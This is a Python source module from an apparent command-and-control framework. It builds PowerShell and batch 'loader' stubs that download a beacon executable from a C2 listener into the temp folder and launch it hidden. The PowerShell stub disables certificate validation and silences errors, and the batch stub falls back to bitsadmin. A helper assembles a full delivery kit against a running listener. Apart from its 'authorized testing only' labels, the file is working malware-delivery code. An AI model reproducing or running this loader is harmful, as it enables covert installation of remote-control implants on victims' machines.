"""PE delivery chain builder for the beacon.

On a Windows target, the operator cannot reliably pre-place files, so we
generate a small stage-1 that fetches the compiled beacon executable from the
C2 listener and executes it in a detonated way. The compiled .exe itself is
built on a Windows host by running the same PyInstaller entrypoint
(build/beacon_entry.py) -- see README build notes.

This produces an obfuscated .ps1 and/or .bat "loader" stub. Authorized use only.
"""
import base64
import os

from .obfuscation import obfuscate_url


def _loader_ps1(beacon_url, name="cscli-beacon.exe"):
    """PowerShell loader: downloads the beacon, runs it with hidden window."""
    return f"""# cscli PE loader (authorized testing only)
$ErrorActionPreference = 'SilentlyContinue'
$url = '{beacon_url}'
$out = Join-Path $env:TEMP 'cscli-beacon.exe'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# optional: ignore self-signed cert for HTTPS listeners
Add-Type @'
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {{
  public bool CheckValidationResult(ServicePoint sp, X509Certificate c,
      WebRequest r, int p) {{ return true; }}
}}'@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process -WindowStyle Hidden -FilePath $out
"""


def _loader_bat(beacon_url, exe_name="cscli-beacon.exe"):
    """cmd.exe loader using bitsadmin or curl for older hosts."""
    return f"""@echo off
setlocal
set URL={beacon_url}
set OUT=%TEMP%\\{exe_name}
where curl >nul 2>nul
if %errorlevel%==0 (
  curl -k -s -o "%OUT%" "%URL%"
) else (
  bitsadmin /transfer csdl /download /priority high "%URL%" "%OUT%" >nul 2>nul
)
start /b "" "%OUT%"
"""


def write_pe_loader(beacon_url, out_path, flavor="ps1", comment="authorized"):
    """Write a loader stub (.ps1 or .bat) that pulls the compiled beacon .exe."""
    loader = _loader_ps1(beacon_url) if flavor == "ps1" else _loader_bat(beacon_url)
    header = f"# cscli PE loader  --  {comment}. For authorized testing only.\n"
    with open(out_path, "w") as f:
        f.write(header + loader)
    return out_path


def build_full_drop(team_server, listener_name, out_dir, interval=3, jitter=0.1,
                    key=None, no_verify=False):
    """Assemble a complete delivery kit against a running listener:
      - beacon .py stage-1 (self-contained, inlined) for dev/test on Linux
      - a .ps1 loader stub pointing at this listener's host (for Windows PE)
    Returns dict of written paths.
    """
    url = None
    for l in team_server.listener_status():
        if l["name"] == listener_name:
            url = l["url"]
            break
    if not url:
        raise ValueError(f"listener '{listener_name}' not running")
    os.makedirs(out_dir, exist_ok=True)
    from ..payload import write_payload
    beacon_py = os.path.join(out_dir, "beacon_stage1.py")
    write_payload(url, beacon_py, interval=interval, jitter=jitter,
                  key=key, no_verify=no_verify)
    # PS1 loader (assumes a Windows-compiled .exe is served by this listener;
    # for a real exe, serve it at /beacon.exe via the listener + http static)
    ps1 = os.path.join(out_dir, "loader.ps1")
    write_pe_loader(url + "/beacon.exe", ps1)
    return {"stage1_py": beacon_py, "loader_ps1": ps1, "listener_url": url}
